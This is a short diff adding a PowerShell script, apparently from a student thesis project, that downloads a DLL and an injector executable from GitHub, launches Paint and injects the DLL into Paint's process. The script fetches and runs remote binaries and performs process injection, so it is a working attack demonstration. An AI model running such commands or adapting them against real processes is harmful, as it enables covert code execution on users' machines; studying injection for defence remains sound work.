@@ -1,0 +1,8 @@
+
+wget -Uri https://github.com/PaulaMerino/TFM/blob/main/exec/dllExampleInjection.dll -OutFile "$env:USERPROFILE\dllExampleInjection.dll"
+wget -Uri https://github.com/PaulaMerino/TFM/blob/main/exec/dllcodeInjection.exe -OutFile "$env:USERPROFILE\Downloads\dllcodeInjection.exe"
+
+mspaint.exe
+
+.\dllcodeInjection.exe (Get-process | ?{$_.ProcessName -eq "mspaint"} | Select-Object -ExpandProperty Id)
+
